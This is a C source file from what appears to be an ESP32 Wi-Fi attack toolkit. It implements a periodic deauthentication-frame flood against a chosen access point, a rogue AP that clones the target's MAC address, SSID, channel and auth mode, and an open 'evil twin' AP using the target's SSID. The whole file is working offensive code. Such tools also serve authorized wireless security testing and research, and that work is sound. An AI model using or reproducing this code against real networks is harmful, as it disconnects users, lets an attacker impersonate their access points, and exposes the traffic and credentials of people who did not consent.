/**
 * @file attack_method.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements common methods for various attacks
 */
#include "attack_method.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"

#include "wifi_controller.h"
#include "wsl_bypasser.h"
#include "esp_wifi.h"

static const char *TAG = "main:attack_method";
static esp_timer_handle_t deauth_timer_handle;

static bool deauth_timer_running = false;

// attack_method.c
bool attack_method_broadcast_is_running(void) {
    return deauth_timer_running;
}

/**
 * @brief Callback for periodic deauthentication frame timer
 * 
 * Periodicaly called to send deauthentication frame for given AP
 * 
 * @param arg expects wifi_ap_record_t
 */
static void timer_send_deauth_frame(void *arg){
    wsl_bypasser_send_deauth_frame((wifi_ap_record_t *) arg);
}

/**
 * @details Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
 */
void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_ms){
    if (deauth_timer_running) return;  // guard against double-start
    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame,
        .arg = (void *) ap_record
    };
    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_ms * 1000));
    deauth_timer_running = true;
}

void attack_method_broadcast_stop(){
    if (!deauth_timer_running) return;  // guard against double-stop
    ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
    esp_timer_delete(deauth_timer_handle);
    deauth_timer_running = false;
}

/**
 * @note BSSID is MAC address of APs Wi-Fi interface
 * 
 * @param ap_record target AP that will be cloned/duplicated
 */
void attack_method_rogueap(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Configuring Rogue AP");
    wifictl_set_ap_mac(ap_record->bssid);
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .password = "dummypassword",
            .max_connection = 8,
            .beacon_interval = 100
        },
    };
    memcpy(ap_config.ap.ssid, ap_record->ssid, 32);
    wifictl_ap_start(&ap_config);
}

void attack_method_evil_twin(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Configuring Evil twin AP");
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = WIFI_AUTH_OPEN,
            .max_connection = 8,
            .beacon_interval = 100
        },
    };
    memcpy(ap_config.ap.ssid, ap_record->ssid, 32);
    wifictl_ap_start(&ap_config);
}